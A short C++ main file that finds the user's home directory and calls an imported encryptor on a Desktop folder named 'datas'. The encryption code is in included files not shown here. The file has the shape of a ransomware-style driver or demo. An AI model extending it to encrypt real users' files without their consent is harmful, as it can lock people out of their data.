#include "directory-encryption.cpp"
#include "sys-check.cpp"
#include <cstring>
#include <dirent.h>
#include <string>
#include <sys/stat.h>

int main() {
  PlatformGreeting platformGreeting;
  DirectoryEncryptor directoryEncryptor;

  // Get the home directory
  std::string homeDirectory = platformGreeting.getHomeDirectory();

  // Construct the path to the encryption directory on the desktop
  std::string pathSeparator = platformGreeting.getPathSeparator();
  std::string encryptionDirectory = homeDirectory + pathSeparator + "Desktop" +
                                    pathSeparator + "datas" + pathSeparator;
  // Encrypt the directory
  directoryEncryptor.encrypt(encryptionDirectory);

  return 0;
}
